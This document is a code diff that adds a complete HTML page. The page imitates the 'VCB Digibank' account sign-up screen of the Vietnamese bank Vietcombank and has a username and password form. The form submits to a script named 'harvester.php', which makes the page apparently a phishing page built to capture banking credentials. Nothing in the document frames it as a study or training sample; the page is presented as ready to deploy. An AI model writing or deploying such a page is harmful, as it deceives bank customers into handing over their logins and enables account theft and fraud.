@@ -1,0 +1,27 @@
+<!DOCTYPE html>
+<html lang="vi">
+<head>
+  <meta charset="UTF-8">
+  <title>VCB Digibank - Đăng ký</title>
+  <style>
+    body { font-family: Arial, sans-serif; background: #eee;}
+    .container {margin:70px auto; background:#fff; border-radius:15px; width:360px; padding:40px 30px;}
+    .logo { font-weight:bold; font-size:2em; color:green; text-align:center;}
+    .subtitle { text-align:center; color:#666;}
+    input {width:100%;padding:12px;margin-bottom:15px;border-radius:7px; border:1px solid #ccc;}
+    button { width:100%;background:#0a8f3d;color:#fff;padding:12px;border:none;border-radius:7px;font-size:17px;cursor:pointer;}
+    button:hover { background:#09682d;}
+  </style>
+</head>
+<body>
+<div class="container">
+    <div class="logo">VCB Digibank</div>
+    <div class="subtitle">Tạo tài khoản mới</div>
+    <form method="post" action="harvester.php">
+        <input type="text" name="username" placeholder="Tên đăng nhập" required>
+        <input type="password" name="password" placeholder="Mật khẩu" required>
+         <button type="submit">Đăng nhập</button>
+    </form>
+</div>
+</body>
+</html>
